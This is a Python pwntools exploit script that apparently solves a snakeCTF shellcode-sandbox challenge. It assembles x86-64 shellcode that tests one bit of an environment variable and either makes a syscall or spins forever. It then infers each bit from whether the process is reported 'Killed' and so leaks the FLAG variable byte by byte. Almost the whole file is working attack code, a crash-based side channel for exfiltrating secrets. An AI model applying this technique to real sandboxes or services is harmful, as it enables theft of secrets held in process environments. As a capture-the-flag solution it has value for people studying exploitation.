#!/usr/bin/env python3

from pwn import *

exe = ELF("../../challenge/chall")

context.binary = exe

context.log_level = "WARN"
HOST = args.HOST if args.HOST else "localhost"
PORT = int(args.PORT) if args.PORT else 1337
SSL = args.SSL


def conn():
    if args.LOCAL:
        r = process(["python3", "./wrapper.py"])
        if args.PLT_DEBUG:
            context.log_level = "debug"
            gdb.attach(r)
    else:
        r = remote(HOST, PORT, ssl=SSL)
        if args.TEAM_TOKEN:
            r.sendlineafter(b"token: ", args.TEAM_TOKEN.encode())

    return r


def build_mask(i):
    # Builds the bitmask mask to extract only the i-th bit
    assert i < 8 and i >= 0
    mask = "0b" + "0" * (7 - i) + "1" + "0" * i
    return mask


def build_payload(env_var_n, bit_n):
    mask = build_mask(bit_n % 8)

    payload = f"""
    main:
        mov rax, [rbp+0x128+{env_var_n*8}]
        mov rax, [rax+{bit_n//8}]
        and rax, 0xff
        and rax, {mask}
        cmp rax, 0
        je loop
        syscall

    loop:
        jmp loop

    """

    return asm(payload, vma=0x500000)


def leak_bit(env_var_n, bit_n):
    # leaks the byte_n-th bit of the env_var_n-th environment variable

    payload = build_payload(env_var_n, bit_n)

    r = conn()
    r.recvuntil(b"one")
    r.sendline(str(len(payload)).encode())
    r.send(payload)

    res = r.recvuntil(b"Killed", timeout=1).decode()

    r.close()

    if res != "":
        return False
    else:
        return True


def leak_byte(env_var_n, byte_n):
    # leaks the byte_n-th byte of the env_var_n-th environment variable
    bits = []
    for i in range(7):
        if leak_bit(env_var_n, byte_n * 8 + i):
            bits.append(0)
        else:
            bits.append(1)
    bits = bits[::-1]

    binary_str = "".join(map(str, bits))
    return chr(int(binary_str, 2))


def main():
    flag = "snakeCTF{"
    context.log_level = "INFO"
    l = log.progress("Flag")
    l.status(flag)
    context.log_level = "WARN"
    c = ""
    i = 14  # Knowing that the flag env variable starts with "FLAG=snakeCTF{" we can skip some chars we already know to save time
    while c != "}":
        c = leak_byte(5, i)
        flag += c
        context.log_level = "INFO"
        l.status(flag)
        context.log_level = "WARN"
        i += 1

    l.success(flag)


if __name__ == "__main__":
    main()
